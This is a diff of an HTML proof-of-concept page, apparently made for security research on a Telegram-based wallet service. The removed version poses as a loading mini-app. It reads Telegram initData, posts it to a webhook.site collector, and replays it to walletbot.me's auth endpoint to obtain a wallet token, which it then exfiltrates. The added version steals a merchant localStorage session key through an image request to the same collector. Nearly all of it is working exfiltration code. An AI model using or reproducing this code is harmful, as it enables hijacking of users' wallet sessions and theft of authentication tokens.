@@ -2,53 +2,24 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PoC: Telegram WebApp initData</title>
+  <title>PoC: LocalStorage Exfiltration</title>
 </head>
 <body>
-  <h1>Loading...</h1>
-  <p>App is opening</p>
+  <h2>Proof of Concept: LocalStorage Session Hijack</h2>
+  <p>This page simulates exfiltrating localStorage data (e.g. wpayMerchant-redux-persist) via an image request.</p>
 
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script>
-  const initData = Telegram.WebApp.initData;
-  const initDataUnsafe = Telegram.WebApp.initDataUnsafe;
+  <script>
+    // Replace this with your own webhook.site ID or listener
+    const webhookURL = "https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25";
 
-  console.log("🔐 Telegram initData:", initData);
-  console.log("🔓 Parsed initDataUnsafe:", initDataUnsafe);
+    // Simulate attacker reading localStorage
+    const stolenData = localStorage.getItem("wpayMerchant-redux-persist");
+    const encodedData = encodeURIComponent(stolenData);
 
-  // 1️⃣ Exfiltrate to your webhook (as backup)
-  fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
-    method: "POST",
-    mode: "no-cors",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ initData, initDataUnsafe })
-  });
-
-  // 2️⃣ Try to replay initData to walletbot.me to get real token
-  fetch("https://walletbot.me/api/v1/users/auth/", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      web_view_init_data_raw: initData,
-      ep: "attach+direct"  // optional endpoint context
-    })
-  })
-  .then(res => res.json())
-  .then(data => {
-    console.log("✅ Wallet auth response:", data);
-
-    // 3️⃣ Exfiltrate received token (JWT) to your webhook
-    fetch("https://webhook.site/b5aff070-1f76-46f5-b381-179f78befc25", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ walletAuthResponse: data })
-    });
-  })
-  .catch(err => {
-    console.error("❌ Wallet replay failed:", err);
-  });
-</script>
+    // Exfiltrate using image-based GET request
+    const img = new Image();
+    img.src = webhookURL + "?data=" + encodedData;
+    document.body.appendChild(img);
+  </script>
 </body>
 </html>
